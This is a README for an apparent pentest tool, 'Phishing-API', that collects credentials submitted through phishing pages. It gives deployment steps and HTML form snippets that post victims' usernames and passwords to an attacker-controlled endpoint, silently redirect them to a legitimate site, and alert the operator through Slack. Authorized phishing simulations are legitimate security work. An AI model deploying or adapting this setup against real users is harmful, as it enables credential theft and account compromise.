# Phishing-API
Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot


To Setup :

1) Import the DB SQL Dump Schema to a new MySQL Instance

2) Host the PHP in a web service

3) Configure dbconfig.php

4) Limit Access to the "Results" Directory (Apache's Basic Auth is Recommended)

5) Use SSL and a Domain for the Hosted API (More Believable for Phishing)



To Use : 

1) Point your HTML Form to https://YOUR-API-HERE

	`<FORM METHOD="POST" ACTION="https://YOUR-API-HERE">`

2)  Make sure the "username" and "password" fields are named as such

	`<INPUT NAME="username">`
	
	`<INPUT NAME="password">`
	
3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Site)

	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
	
	`<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">`
	
4) Optionally include hidden input fields for altering the Slack bot's behavior (Name and Emoji)

	`<INPUT NAME="slackbotname" VALUE="SuckerBot" TYPE="hidden">`
	
	`<INPUT NAME="slackemoji" VALUE=":see_no_evil:" TYPE="hidden">`
	
5) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials


![Notification to Slack Channel](https://i.imgur.com/BIYQWry.jpg)



![View Captured Credentials via Web](https://i.imgur.com/UjMVPJ3.jpg)
